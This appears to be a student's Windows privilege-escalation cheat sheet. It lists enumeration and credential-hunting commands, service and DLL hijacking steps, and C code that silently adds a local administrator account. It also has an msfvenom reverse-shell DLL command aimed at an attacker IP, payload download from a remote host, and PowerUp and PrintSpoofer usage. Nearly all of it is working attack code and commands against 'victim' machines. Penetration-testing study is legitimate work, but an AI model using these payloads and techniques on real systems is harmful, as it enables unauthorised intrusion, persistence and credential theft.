# Enum
## Info useful
- Usrname , hostname
- Group memberships of current user
- Existing users and groups
- OS,version ,architecture
- Network Info
- Installed app
- Running process

## Basic enum
- ``` whoami /groups ```  display all groups our current user is a member
- ``` Get-LocalUser ```  obtain a list of all local users 
- ``` Get-LocalGroup ``` existing groups in local
- ``` Get-LocalGroupMember {Group_name} ``` list users under a group
- ``` systeminfo ``` care 32 or 64 bits
- ``` netstat -ano ``` search service
- ``` Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname ``` Get installed app 32 bits
- ``` Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname ``` Get installed app 64 bits
- ``` Get-Process ```
- get path of a process: ``` Get-Process | Select-Object Name,Path | Select-String "NonStandardProcess" ```
- Check if have remote access (rdp) ``` net user xxx``` and see local group memberships
    have = *Remote Management Use Users*

## Hidden info
- Searching attackable files in system ``` Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue ```
- Can search if have password ``` Get-ChildItem -Path C:\xampp\apache -Include *.txt ,*.ini -File -Recurse -ErrorAction SilentlyContinue ```
- Can search user desktop ``` C:\Users\{user_name}\Desktop ``` <- probably here lol
  
## Get Powershell using history
- ``` Get-History ```
- ``` (Get-PSReadlineOption).HistorySavePath ``` Get history save path
- check if have sussy thing e.g. transcript.txt from pwsh transcript
- Hunt with Event Viewer -> Script block logging (code 4104) check if have password there ``` path: Logs > Microsoft > Windows > PowerShell > Operational ```

## Auto tool 
### evil-winrm
- connecting to victim get full shell for memory inject / other nasty shit
### Winpeas (may be info not correct)
- Get file from remote ``` iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe ```
  

# Hijack window service
- Target find some exe origin is from that user and able to modify
- If want to modify exe, better backup one first! e.g. ``` move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak ```
- Can use rev shell / add user with powershell command (2 approach)
## Sevice binary
- May require RDP to use
- ``` Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} ``` get WMI (Windows Management Instrumentation)services and see starting path
- check if have customed path ``` --default-files```
- Check permission with ``` icacls {path} ```
- Mask 	Permissions
    F 	Full access
    M 	Modify access
    RX 	Read and execute access
    R 	Read-only access
    W 	Write-only access
- prepare modified.c to compile and throw to victim
    ``` 
        #include <stdlib.h>

            int main ()
            {
            int i;
            
            i = system ("net user dave2 password123! /add");
            i = system ("net localgroup administrators dave2 /add");
            
            return 0;
            } 
    ```
- restart service ``` net stop / start xxx```
- ``` Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'} ``` Get list of have auto start enabled 
- ``` whoami /priv ``` check priviledge
- If no shutdown priv -> reboot ``` shutdown /r /t 0 ```
- ``` Start-Process powershell -Verb runAs ``` run as administrator

## DLL
- Hard to hijack since the load order is like this: 
    ``` 
        1. The directory from which the application loaded.
        2. The system directory.
        3. The 16-bit system directory.
        4. The Windows directory. 
        5. The current directory.
        6. The directories that are listed in the PATH environment variable.
    ``` 
- Process monitor maybe disabled for some user -> (still need priv) copy procmon binary to local and run 
- can load rev shell inside dll e.g. ``` msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.250 LPORT=4444 -f dll -o EnterpriseServiceOptional.dll```

### Procmon tool
- start and filter xxx.exe 
- Filter Process name is xx.exe then trigger restart the exe  ``` Restart-Service xxx```
- find orphan dll (name not found) and check ```$env:path``` if match
- possble dll injection code ~ ```hack.cpp```: 
  ```
    #include <stdlib.h>
    #include <windows.h>

    BOOL APIENTRY DllMain(
    HANDLE hModule,// Handle to DLL module
    DWORD ul_reason_for_call,// Reason for calling function
    LPVOID lpReserved ) // Reserved
    {
        switch ( ul_reason_for_call )
        {
            case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            int i;
            i = system ("net user dave2 password123! /add");
            i = system ("net localgroup administrators dave2 /add");
            break;
            case DLL_THREAD_ATTACH: // A process is creating a new thread.
            break;
            case DLL_THREAD_DETACH: // A thread exits normally.
            break;
            case DLL_PROCESS_DETACH: // A process unloads the DLL.
            break;
        }
        return TRUE;
    }
  ```
- compile to dll ``` x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll ```
- move dll to the folder next to the exe 

### Auto tool: Powerup.ps1
- ``` cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 . ``` script location
- pull to victim pc  
- ``` powershell -ep bypass ``` allow script to load module
- ``` . .\PowerUp.ps1 ```
- ``` Get-ModifiableServiceFile ``` Find modifiable service files
- ``` Install-ServiceBinary -Name xxx ``` abuse func to add user john for us 
- ``` $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal ``` !!! check real permission of file -> what can run what cannot run , that process initating user may not have that permission to do add user in system. then just rev shell is enough
- Default username password of powerup : ``` john|Password123! ``` (rmb chg \! when run command)

## Unquoted Service paths
- unquoted path: windows will try to start exe follow this order
  ``` 
    C:\Program.exe
    C:\Program Files\My.exe
    C:\Program Files\My Program\My.exe
    C:\Program Files\My Program\My service\service.exe
   ```
- cmd enum services(more effective): ``` wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """ ```
- pwsh enum services: ``` Get-CimInstance -ClassName win32_service | Select Name,State,PathName ```
- think which path can leverage?
- then move rev shell exe to that path e.g. ``` C:\Program Files\My Program\My.exe ``` if ``` C:\Program Files\My Program ``` is able to write 

### Auto tool: Powerup.ps1
- same as above until loaded ps1 file
- ``` Get-UnquotedService ``` fine unquoted path services
- run the command mentioned in AbuseFunction and modify the path
- Should get john in admin group if success ``` net localgroup administrators ```

# Other Ways (non window services)
## Scheuled task
- list sch task list ``` schtasks /query /fo LIST /v ``` 
- Care about taskname, author, task to run, next run time
- check permission to run that task 
- change the file to be run 

## public exploit
-  kernel exploit (easy crash)
### printspoofer
-  If ```whoami /priv``` shows ``` SeImpersonatePrivlege``` enabled = can use 
-   ``` .\PrintSpoofer64.exe -i -c powershell.exe ```
-   

# Struggling point
- may need one user jump to another and then jump to another and still not priviledged

## fancy shit 
1. SeBackupPrivilege (disabled) still can hack!
    - https://github.com/giuliano108/SeBackupPrivilege 
    - after enabled then copy the file out and read 